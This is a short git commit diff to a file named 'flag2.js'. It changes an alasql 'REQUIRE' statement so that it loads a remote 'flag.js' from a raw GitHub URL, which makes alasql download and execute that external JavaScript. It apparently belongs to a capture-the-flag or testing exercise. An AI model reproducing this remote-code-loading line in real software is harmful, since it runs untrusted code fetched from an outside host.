6537d089fe43ddcc92c44058a1e6920bdf141937
vr2 <hydw9898@gmail.com>
2024-11-15 09:38:27 +0900

    Update flag2.js

--- flag2.js
+++ flag2.js
@@ -1,6 +1,6 @@
 const alasql = require('alasql');
 
-alasql('REQUIRE "https://github.com/vr2/1/blob/main/flag.js"');
+alasql('REQUIRE "https://raw.githubusercontent.com/vr2/1/refs/heads/main/flag.js"');
 
 alasql('CREATE TABLE WOO (content TEXT)');
 
